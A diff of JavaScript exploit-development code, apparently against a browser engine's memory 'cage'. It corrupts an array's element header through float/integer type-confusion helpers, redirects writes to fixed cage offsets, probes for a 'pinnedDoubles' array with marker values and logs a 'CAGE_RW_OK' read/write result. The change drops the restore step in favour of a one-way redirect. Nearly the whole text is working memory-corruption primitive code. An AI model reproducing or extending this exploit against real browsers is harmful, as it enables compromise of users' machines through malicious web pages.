@@ -46,37 +46,30 @@ if(Array.isArray(m)){
   log("HDR@"+hdr.toString(16));
   const orig=f2i(m[hdr]);
 
-  // WRITE TEST: redirect elements to 0x1100011, write marker, check pinnedDoubles
-  pinnedDoubles[0]=10.125; // ensure known state
-  m[hdr]=i2f((BigInt(MAXS)<<32n)|0x1100011n); // redirect
-  m[0]=i2f(0xBEEF4242CAFE9999n); // write marker to cage+0x1100018
-  m[hdr]=i2f(orig); // restore elements
-  const pdAfter=pinnedDoubles[0];
-  const pdChanged=(pdAfter!==10.125);
-  log("WR_1100011: pd="+pdAfter+" changed="+pdChanged);
-
-  // Try 0x1080011 (original PIN)
+  // STEP 1: Write marker at original PIN (0x1080011) base — no redirect needed
   pinnedDoubles[0]=10.125;
-  m[0]=i2f(0xBEEF4242CAFE9999n); // write at original PIN base
-  const pd2=pinnedDoubles[0];
-  log("WR_1080011: pd="+pd2+" changed="+(pd2!==10.125));
+  m[0]=i2f(0xBEEF4242CAFE9999n);
+  let pd1=pinnedDoubles[0];
+  log("WR0: pd="+(pd1===10.125?"same":"CHANGED!"));
 
-  // If either changed pinnedDoubles, we found PD!
-  if(pdChanged){
-    log("PD_AT_1100011");
-  }else if(pd2!==10.125){
-    log("PD_AT_1080011");
-  }else{
-    log("PD_NOT_AT_EITHER");
-    // Try: write to m[1], m[2] etc at original PIN → maybe PD starts at a later offset
-    pinnedDoubles[0]=10.125;
-    for(let k=0;k<8;k++){
+  // Try offsets 1-4 at original PIN
+  if(pd1===10.125){
+    for(let k=1;k<=4;k++){
+      pinnedDoubles[0]=10.125;
       m[k]=i2f(0xBEEF4242CAFE9999n);
-      if(pinnedDoubles[0]!==10.125){log("PD_OFFSET: "+k);pinnedDoubles[0]=10.125;break;}
+      if(pinnedDoubles[0]!==10.125){log("PD_AT_ORIG+"+k);break;}
     }
   }
 
-  pinnedDoubles[0]=10.125; // restore
+  // STEP 2: Redirect to 0x1100011 and write — ONE-WAY (no restore)
+  pinnedDoubles[0]=10.125;
+  m[hdr]=i2f((BigInt(MAXS)<<32n)|0x1100011n);
+  // Now m[0] accesses cage+0x1100018
+  m[0]=i2f(0xDEAD5678CAFE1234n);
+  pd1=pinnedDoubles[0];
+  log("WR_1100: pd="+(pd1===10.125?"same":"CHANGED="+f2i(pd1).toString(16)));
+
+  // Can't restore — hdr is at wrong offset now. Just check results.
   log("W: "+wasmI.exports.f());
   log("CAGE_RW_OK");
 }else{log("NO_ARR");}
